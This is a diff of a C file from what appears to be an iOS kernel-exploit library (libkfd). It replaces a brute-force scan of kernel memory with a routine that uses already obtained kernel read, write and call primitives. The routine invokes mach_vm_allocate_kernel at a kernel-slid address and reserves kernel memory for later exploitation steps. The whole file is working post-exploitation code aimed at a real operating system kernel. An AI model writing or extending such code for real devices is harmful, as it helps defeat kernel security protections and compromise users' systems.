@@ -1,43 +1,65 @@
 
 #include "libkfd.h"
 
-uint64_t kalloc_data_extern;
+/*
+ kern_return_t
+ mach_vm_allocate_kernel(
+     vm_map_t                map,
+     mach_vm_offset_t        *addr,
+     mach_vm_size_t  size,
+     int                     flags,
+     vm_tag_t    tag)
+ */
 
-u64 kalloc_data(size_t size) {
+uint64_t kalloc_scratchbuf = 0;
+#define VM_KERN_MEMORY_BSD 2
+
+// mach_vm_allocate_kernel
+uint64_t mach_vm_allocate_kernel_func = 0;
+
+uint64_t mach_kalloc_init() {
     
-    printf("kalloc: 0x%02llX 0x%02llX\n", kalloc_data_extern + ((struct kfd*)(kcall_kfd))->info.kernel.kernel_slide, kalloc_data_extern);
+    uint64_t kernel_map = ((struct kfd*)kcall_kfd)->info.kernel.kernel_map;
     
-    uint64_t base = kcall(kalloc_data_extern + ((struct kfd*)(kcall_kfd))->info.kernel.kernel_slide, size, 0, 0, 0, 0, 0, 0);
+    uint64_t unstable_scratchbuf = dirty_kalloc(kcall_kfd, 100);
     
-    printf("base kalloc: 0x%02llX\n", base);
+    kern_return_t ret = (kern_return_t)kcall(mach_vm_allocate_kernel_func + kernel_slide,
+          kernel_map,
+          unstable_scratchbuf,
+          0x4000,
+          VM_FLAGS_ANYWHERE,
+          VM_KERN_MEMORY_BSD,
+          0,0);
     
-    uint64_t begin = ((struct kfd*)(kcall_kfd))->info.kernel.kernel_proc;
-    uint64_t end = begin + 0x40000000;
-    uint64_t addr = begin;
+    uint64_t addr = _kread64(kcall_kfd, unstable_scratchbuf);
+    
+    printf("kalloc ret: %d, 0x%02llX\n", ret, addr);
+    kalloc_scratchbuf = addr;
+    
+    _kwrite64(kcall_kfd, unstable_scratchbuf, 0);
+    
+    return addr;
+}
+
+uint64_t kalloc(size_t size) {
+    
+    if (kalloc_scratchbuf == 0) {
+        mach_kalloc_init();
+    }
+    
+    uint64_t kernel_map = ((struct kfd*)kcall_kfd)->info.kernel.kernel_map;
         
-    while (addr < end) {
-        bool found = false;
-        for (int i = 0; i < size; i+=4) {
-            uint32_t val = _kread32(kcall_kfd, addr+i);
-            found = true;
-            if (val != 0) {
-                found = false;
-                addr += i;
-                
-                printf("found potential alloc, 0x%02llX\n", addr);
-                break;
-            }
-        }
-        if (found && (uint32_t)addr == base) {
-            printf("[+] dirty_kalloc: 0x%llx\n", addr);
-            return addr;
-        }
-        addr += 0x1000;
-    }
-    if (addr >= end) {
-        printf("[-] failed to find free space in kernel\n");
-        exit(EXIT_FAILURE);
-    }
-    return 0;
+    kern_return_t ret = (kern_return_t)kcall(mach_vm_allocate_kernel_func + kernel_slide,
+          kernel_map,
+          kalloc_scratchbuf,
+          0x4000,
+          VM_FLAGS_ANYWHERE,
+          VM_KERN_MEMORY_BSD,
+          0,0);
     
+    uint64_t addr = _kread64(kcall_kfd, kalloc_scratchbuf);
+        
+    _kwrite64(kcall_kfd, kalloc_scratchbuf, 0);
+    
+    return addr;
 }
